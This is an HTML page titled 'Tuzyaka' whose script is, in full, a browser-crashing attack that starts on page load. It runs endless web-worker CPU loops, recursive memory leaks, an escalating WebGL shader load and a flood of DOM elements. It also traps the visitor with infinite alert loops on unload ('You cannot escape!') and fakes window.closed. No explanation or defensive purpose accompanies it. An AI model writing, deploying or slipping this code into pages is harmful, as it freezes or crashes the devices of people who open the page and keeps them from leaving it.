<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Tuzyaka</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    <script>
        let cpuMultiplier = 1;
        let memoryMultiplier = 1;
        let gpuMultiplier = 1;
        let domMultiplier = 1;

        function overloadCPU() {
            const workerCode = `
                let iteration = 0;
                onmessage = function() {
                    while (true) {
                        let x = 0;
                        for (let i = 0; i < 10000000; i++) {
                            x += Math.sin(Math.random()) * Math.cos(Math.random());
                            x += Math.pow(Math.random(), 2);
                            iteration++;
                        }
                        postMessage({ type: 'iteration', data: iteration * 2 });
                    }
                };
            `;
            for (let i = 0; i < navigator.hardwareConcurrency * 4 * cpuMultiplier; i++) {
                try {
                    const blob = new Blob([workerCode], { type: "application/javascript" });
                    const worker = new Worker(URL.createObjectURL(blob));
                    worker.postMessage("start");
                    worker.onmessage = function(event) {
                        if (event.data.type === 'iteration') {
                            cpuMultiplier += 1;
                            overloadCPU();
                        }
                    };
                } catch (e) {
                    setInterval(() => {
                        let x = 0;
                        for (let i = 0; i < 10000000 * cpuMultiplier; i++) {
                            x += Math.sin(Math.random()) * Math.cos(Math.random());
                            x += Math.pow(Math.random(), 2);
                        }
                    }, 0);
                }
            }
            overloadCPU();
        }

        function overloadMemory() {
            let memorySink = [];
            function leak() {
                for (let i = 0; i < 1000 * memoryMultiplier; i++) {
                    memorySink.push(new Uint32Array(1000000 * memoryMultiplier));
                }
                memoryMultiplier += 0.5;
                leak();
            }
            leak();
        }

        function overloadGPU() {
            const canvas = document.getElementById("canvas");
            canvas.width = window.innerWidth * 3 * gpuMultiplier;
            canvas.height = window.innerHeight * 3 * gpuMultiplier;
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return;
            const vsSource = `
                attribute vec4 aPosition;
                void main() {
                    gl_Position = aPosition;
                }
            `;
            const fsSource = `
                precision highp float;
                uniform float uTime;
                void main() {
                    float r = 0.0, g = 0.0, b = 0.0;
                    for (int i = 0; i < ${10000 * gpuMultiplier}; i++) {
                        r += sin(float(i) * uTime * 0.1);
                        g += cos(float(i) * uTime * 0.2);
                        b += tan(float(i) * uTime * 0.3);
                    }
                    gl_FragColor = vec4(mod(r, 1.0), mod(g, 1.0), mod(b, 1.0), 1.0);
                }
            `;
            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);
            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);
            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
            const aPosition = gl.getAttribLocation(program, "aPosition");
            gl.enableVertexAttribArray(aPosition);
            gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);
            const uTime = gl.getUniformLocation(program, "uTime");
            function render() {
                gl.uniform1f(uTime, performance.now() / 1000);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                gpuMultiplier += 0.1;
                requestAnimationFrame(render);
            }
            render();
            overloadGPU();
        }

        function overloadDOM() {
            function createChaos() {
                for (let i = 0; i < 500 * domMultiplier; i++) {
                    const div = document.createElement("div");
                    div.style.position = "absolute";
                    div.style.left = Math.random() * 100 + "%";
                    div.style.top = Math.random() * 100 + "%";
                    div.style.width = `${150 * domMultiplier}px`;
                    div.style.height = `${150 * domMultiplier}px`;
                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    div.style.boxShadow = "0 0 80px rgba(255,0,0,1)";
                    div.style.transform = `rotate(${Math.random() * 360}deg)`;
                    document.body.appendChild(div);
                }
                domMultiplier += 1;
                createChaos();
            }
            createChaos();
        }

        window.onbeforeunload = function() {
            while (true) {
                alert("You cannot escape!");
            }
            return "Unstoppable!";
        };
        window.onunload = function() {
            while (true) {
                alert("System overload continues!");
            }
            overloadCPU();
            overloadMemory();
            overloadGPU();
            overloadDOM();
        };
        Object.defineProperty(window, "closed", { get: function() { return false; } });

        overloadCPU();
        overloadMemory();
        overloadGPU();
        overloadDOM();
    </script>
</body>
</html>
